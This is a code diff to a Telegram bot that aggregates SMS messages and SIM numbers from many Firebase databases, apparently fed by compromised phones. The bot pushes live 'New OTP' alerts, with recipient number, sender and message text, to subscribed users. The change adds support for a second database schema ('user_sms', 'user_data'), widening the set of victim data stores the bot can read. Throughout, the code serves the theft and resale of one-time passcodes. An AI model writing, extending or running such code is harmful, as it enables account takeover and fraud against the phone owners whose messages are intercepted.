@@ -43,7 +43,7 @@ const rawServers = require('./servers.json');
 const uniqueServers = [];
 const seenUrls = new Set();
 rawServers.forEach(srv => {
-    if (srv.type === 'std' && !seenUrls.has(srv.url)) {
+    if ((srv.type === 'std' || srv.type === 'v2') && !seenUrls.has(srv.url)) {
         seenUrls.add(srv.url);
         uniqueServers.push(srv);
     }
@@ -54,7 +54,8 @@ const servers = uniqueServers.map((srv, i) => {
         id: `S_${i + 1}`,
         name: srv.label,
         url: srv.url,
-        path: srv.path
+        path: srv.path,
+        type: srv.type
     };
 });
 
@@ -160,17 +161,26 @@ async function getWithTimeout(dbRef, timeoutMs = 1500) {
     ]);
 }
 
-async function getDeviceNumbers(db, serverPath, deviceId) {
+async function getDeviceNumbers(db, server, deviceId) {
     try {
-        const snap = await getWithTimeout(ref(db, `${serverPath}/SimINFO/${deviceId}`), 1500);
-        if (snap.exists()) {
-            const info = snap.val();
-            let nums = [];
-            if (info.sim1) nums.push(extractNumberAndCarrier(info.sim1));
-            if (info.sim2) nums.push(extractNumberAndCarrier(info.sim2));
-            
-            nums = nums.filter(n => n && n.trim() !== '');
-            if (nums.length > 0) return nums.join(' | ');
+        if (server.type === 'v2') {
+            const snap = await getWithTimeout(ref(db, `user_data/${deviceId}`), 1500);
+            if (snap.exists()) {
+                const info = snap.val();
+                if (info.phoneNumber) return info.phoneNumber;
+                if (info.Device_info) return info.Device_info.split('\n')[0];
+            }
+        } else {
+            const snap = await getWithTimeout(ref(db, `${server.path}/SimINFO/${deviceId}`), 1500);
+            if (snap.exists()) {
+                const info = snap.val();
+                let nums = [];
+                if (info.sim1) nums.push(extractNumberAndCarrier(info.sim1));
+                if (info.sim2) nums.push(extractNumberAndCarrier(info.sim2));
+                
+                nums = nums.filter(n => n && n.trim() !== '');
+                if (nums.length > 0) return nums.join(' | ');
+            }
         }
     } catch (e) {}
     return "Unknown Number"; 
@@ -204,11 +214,12 @@ async function fetchAllNumbersFromAllServers() {
         const db = dbs[server.id];
         if (!db) return;
         try {
-            const snapshot = await getWithTimeout(ref(db, `${server.path}/Sms`), 1500);
+            const basePath = server.type === 'v2' ? 'user_sms' : `${server.path}/Sms`;
+            const snapshot = await getWithTimeout(ref(db, basePath), 1500);
             if (snapshot.exists()) {
                 const deviceIds = Object.keys(snapshot.val());
                 const devPromises = deviceIds.map(async (did) => {
-                    const num = await getDeviceNumbers(db, server.path, did);
+                    const num = await getDeviceNumbers(db, server, did);
                     return { text: `📱 ${num} [${server.name}]`, callback_data: `otp_${server.id}_${did}` };
                 });
                 const buttons = await Promise.all(devPromises);
@@ -226,11 +237,12 @@ async function sendServerNumbers(chatId, serverId, serverName) {
         const db = dbs[serverId];
         if (!db) return bot.sendMessage(chatId, "Database not found for " + serverName);
         
-        const snapshot = await getWithTimeout(ref(db, `${server.path}/Sms`), 1500);
+        const basePath = server.type === 'v2' ? 'user_sms' : `${server.path}/Sms`;
+        const snapshot = await getWithTimeout(ref(db, basePath), 1500);
         if (snapshot.exists()) {
             const deviceIds = Object.keys(snapshot.val());
             const devPromises = deviceIds.map(async (did) => {
-                const num = await getDeviceNumbers(db, server.path, did);
+                const num = await getDeviceNumbers(db, server, did);
                 return { text: `📱 ${num}`, callback_data: `otp_${serverId}_${did}` };
             });
             const buttons = await Promise.all(devPromises);
@@ -420,14 +432,21 @@ bot.on('callback_query', async (query) => {
         try {
             const server = servers.find(s => s.id === srvId);
             const db = dbs[srvId];
-            const deviceNum = await getDeviceNumbers(db, server.path, deviceId);
-            const snapshot = await getWithTimeout(ref(db, `${server.path}/Sms/${deviceId}`), 4000);
+            const deviceNum = await getDeviceNumbers(db, server, deviceId);
+            const basePath = server.type === 'v2' ? `user_sms/${deviceId}` : `${server.path}/Sms/${deviceId}`;
+            const snapshot = await getWithTimeout(ref(db, basePath), 4000);
             
             if (snapshot.exists()) {
                 const messages = snapshot.val();
                 let allMsgs = [];
                 for (const [msgId, msgData] of Object.entries(messages)) {
-                    if (msgData && msgData.msg) {
+                    if (server.type === 'v2' && msgData && msgData.body) {
+                        allMsgs.push({
+                            msg: msgData.body,
+                            ph: msgData.sender,
+                            date: parseInt(msgData.timestamp || 0)
+                        });
+                    } else if (msgData && msgData.msg) {
                         allMsgs.push({
                             msg: msgData.msg,
                             ph: msgData.ph,
@@ -468,7 +487,8 @@ async function setupLiveListeners() {
         if (!db) return;
         
         try {
-            const devicesRef = ref(db, `${server.path}/Sms`);
+            const basePath = server.type === 'v2' ? 'user_sms' : `${server.path}/Sms`;
+            const devicesRef = ref(db, basePath);
             
             // Just attach onChildAdded, it triggers for all existing devices and future ones
             onChildAdded(devicesRef, (deviceSnapshot) => {
@@ -480,15 +500,26 @@ async function setupLiveListeners() {
 }
 
 function attachListenerToDevice(db, server, deviceId) {
-    const msgsRef = ref(db, `${server.path}/Sms/${deviceId}`);
+    const basePath = server.type === 'v2' ? `user_sms/${deviceId}` : `${server.path}/Sms/${deviceId}`;
+    const msgsRef = ref(db, basePath);
     const latestQuery = query(msgsRef, limitToLast(1));
     
     onChildAdded(latestQuery, async (msgSnapshot) => {
         const msgId = msgSnapshot.key;
         const msgData = msgSnapshot.val();
         
-        if (msgData && msgData.msg) {
-            const msgDate = parseInt(msgData.date || 0);
+        let msgText, msgPh, msgDate;
+        if (server.type === 'v2' && msgData && msgData.body) {
+            msgText = msgData.body;
+            msgPh = msgData.sender;
+            msgDate = parseInt(msgData.timestamp || 0);
+        } else if (msgData && msgData.msg) {
+            msgText = msgData.msg;
+            msgPh = msgData.ph;
+            msgDate = parseInt(msgData.date || 0);
+        }
+        
+        if (msgText) {
             
             // Ignore messages loaded during the first 15 seconds of bot startup
             if (Date.now() - botStartTime < 15000) {
@@ -500,8 +531,8 @@ function attachListenerToDevice(db, server, deviceId) {
                 notifiedMessages.add(msgId);
                 
                 const dt = new Date(msgDate).toLocaleString();
-                const deviceNum = await getDeviceNumbers(db, server.path, deviceId);
-                const alertMsg = `🔥 <b>New OTP [${server.name}]</b> 🔥\n\n<b>To Number:</b> <code>${escapeHtml(deviceNum)}</code>\n<b>From:</b> ${escapeHtml(msgData.ph)}\n<b>Time:</b> ${escapeHtml(dt)}\n\n<b>Message:</b>\n${escapeHtml(msgData.msg)}`;
+                const deviceNum = await getDeviceNumbers(db, server, deviceId);
+                const alertMsg = `🔥 <b>New OTP [${server.name}]</b> 🔥\n\n<b>To Number:</b> <code>${escapeHtml(deviceNum)}</code>\n<b>From:</b> ${escapeHtml(msgPh)}\n<b>Time:</b> ${escapeHtml(dt)}\n\n<b>Message:</b>\n${escapeHtml(msgText)}`;
                 
                 // Broadcast to all authorized users subscribed to this server
                 for (const [uid, data] of Object.entries(usersDB.users)) {
